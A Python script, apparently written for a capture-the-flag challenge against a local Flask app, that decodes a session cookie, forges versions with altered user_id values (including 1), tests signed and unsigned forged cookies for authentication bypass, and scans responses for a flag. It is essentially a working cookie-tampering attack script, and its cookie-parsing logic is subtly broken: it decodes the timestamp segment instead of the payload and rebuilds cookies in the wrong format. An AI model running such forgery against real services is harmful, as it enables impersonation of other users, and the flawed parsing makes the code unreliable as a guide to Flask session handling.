import requests
import base64
import json
import time
from urllib.parse import unquote
import re

# Target URL
target_url = "http://127.0.0.1:33198/"

print("="*80)
print("FLASK SESSION COOKIE ANALYSIS & AUTH BYPASS TEST")
print("="*80)

# Step 1: Initial request with existing session cookie
print("\n[+] Making initial GET request with existing session cookie...")
session_value = "eyJ1c2VyX2lkIjoxMDAzMn0.aVfKCw.jl3AMMmNnBqRtf0OTxwr0Uo3aeg"
print(f"Using session: {session_value[:50]}...")

cookies = {'session': session_value}
response = requests.get(target_url, cookies=cookies, allow_redirects=True, timeout=10)
print(f"Status Code: {response.status_code}")
print(f"Final URL: {response.url}")
print(f"Response Length: {len(response.text)} bytes")

# Step 3: Decode session cookie
print("\n[+] DECODING SESSION COOKIE")
print("="*80)
print(f"Raw session cookie: {session_value}")

# Flask session format: .<base64_payload>.<signature>
parts = session_value.split('.')
print(f"Number of parts: {len(parts)}")

if len(parts) >= 2:
    # Extract payload
    payload_b64 = parts[0] if len(parts) == 2 else parts[1]
    print(f"Payload (base64): {payload_b64}")
    
    # Fix padding
    padding = 4 - (len(payload_b64) % 4)
    if padding != 4:
        payload_b64 += '=' * padding
    
    try:
        # Decode base64
        payload_bytes = base64.urlsafe_b64decode(payload_b64)
        payload_str = payload_bytes.decode('utf-8')
        print(f"Decoded payload: {payload_str}")
        
        # Parse JSON
        session_data = json.loads(payload_str)
        print(f"\n[*] DECODED SESSION DATA:")
        print(json.dumps(session_data, indent=2))
        
        # Extract user_id
        if 'user_id' in session_data:
            user_id = session_data['user_id']
            print(f"\n[!] Current user_id: {user_id}")
            
    except Exception as e:
        print(f"[!] Error decoding: {e}")

# Step 4: Signature analysis
print("\n[+] SIGNATURE ANALYSIS")
print("="*80)
if len(parts) >= 3:
    signature = parts[2] if len(parts) == 3 else parts[2]
    print(f"Signature: {signature}")
    print("[+] Signed session cookie detected")
    print("[!] Without secret key, cannot forge valid signatures")
elif len(parts) == 2:
    print("[+] 2-part format: <payload>.<signature>")
else:
    print("[-] Unexpected format")

# Step 6: Test session manipulation
print("\n[+] SESSION MANIPULATION TEST")
print("="*80)

modified_data = session_data.copy()
modified_data['user_id'] = 1
print(f"Original user_id: {user_id}")
print(f"Modified user_id: {modified_data['user_id']}")

# Encode modified session
modified_json = json.dumps(modified_data, separators=(',', ':'))
modified_b64 = base64.urlsafe_b64encode(modified_json.encode()).decode().rstrip('=')
print(f"Modified base64: {modified_b64}")

# Try keeping original signature
if len(parts) == 2:
    modified_session = f"{modified_b64}.{parts[1]}"
else:
    modified_session = f".{modified_b64}.{parts[2]}"

print(f"Modified session: {modified_session[:50]}...")

# Test modified session
print("\n[+] TESTING MODIFIED SESSION")
modified_cookies = {'session': modified_session}
test_response = requests.get(target_url, cookies=modified_cookies, allow_redirects=True, timeout=10)
print(f"Status Code: {test_response.status_code}")
print(f"Final URL: {test_response.url}")

if test_response.url == target_url:
    print("[!] MODIFIED SESSION ACCEPTED - NO REDIRECT!")
    print("[!] POTENTIAL AUTH BYPASS VULNERABILITY!")
    print(f"[!] Response preview: {test_response.text[:150]}...")
elif 'login' in test_response.url:
    print("[-] Modified session rejected")
    print("[+] Server validates signatures")
else:
    print(f"[?] Unexpected: {test_response.url}")

# Test unsigned session
print("\n[+] TESTING UNSIGNED SESSION")
unsigned_session = modified_b64
print(f"Unsigned: {unsigned_session[:50]}...")

unsigned_cookies = {'session': unsigned_session}
test_response2 = requests.get(target_url, cookies=unsigned_cookies, allow_redirects=True, timeout=10)
print(f"Status Code: {test_response2.status_code}")
if test_response2.url == target_url:
    print("[!] UNSIGNED ACCEPTED - CRITICAL VULNERABILITY!")
elif 'login' in test_response2.url:
    print("[-] Unsigned rejected")

# Test different user IDs
print("\n[+] TESTING COMMON USER IDs")
for test_id in [0, 1, 2, 3, 10, 100, 99999]:
    test_data = session_data.copy()
    test_data['user_id'] = test_id
    test_json = json.dumps(test_data, separators=(',', ':'))
    test_b64 = base64.urlsafe_b64encode(test_json.encode()).decode().rstrip('=')
    
    if len(parts) == 2:
        test_session = f"{test_b64}.{parts[1]}"
    else:
        test_session = f".{test_b64}.{parts[2]}"
        
    test_cookies = {'session': test_session}
    resp = requests.get(target_url, cookies=test_cookies, allow_redirects=False, timeout=5)
    
    if resp.status_code == 200:
        print(f"[!] User ID {test_id}: ACCEPTED")
    else:
        print(f"[-] User ID {test_id}: Status {resp.status_code}")

# Check for flags in responses
print("\n[+] CHECKING FOR FLAGS")
responses = [response, test_response, test_response2]
for i, resp in enumerate(responses):
    if 'FLAG{' in resp.text:
        flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
        if flag_match:
            print(f"[!] FLAG FOUND in response {i}: {flag_match.group(0)}")

print("\n" + "="*80)
print("ANALYSIS COMPLETE")
print("="*80)
